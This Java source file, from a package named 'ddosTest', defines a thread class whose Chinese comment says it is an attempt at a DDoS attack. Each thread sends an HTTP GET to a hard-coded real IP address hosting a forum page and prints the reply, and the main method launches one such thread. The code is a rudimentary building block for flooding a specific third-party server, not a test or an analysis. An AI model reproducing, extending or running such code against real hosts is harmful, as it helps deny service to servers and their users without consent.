package com.br.dong.httpclientTest.ddosTest;

import com.br.dong.httpclientTest.CrawlerUtil;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;

/**
 * Created with IntelliJ IDEA.
 * User: Dong
 * Date: 14-10-31
 * Time: 下午5:14
 * To change this template use File | Settings | File Templates.
 *尝试使用ddos攻击
 */
public class DdosThreadTask extends Thread{
   private CrawlerUtil client=new CrawlerUtil();
    public void run(){
        try {
            Document doc=client.getDocUTF8(client.noProxyGetUrl("http://107.150.17.66/forum-75-1.html"));
            System.out.println(doc.toString());

        } catch (IOException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (CloneNotSupportedException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }
    }

    public DdosThreadTask() {
        try {
            client.clientCreatNoUrl("http");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        } catch (KeyManagementException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }

    }


    public static void main(String[] args) {
        DdosThreadTask task=new DdosThreadTask();
        task.start();
    }

}
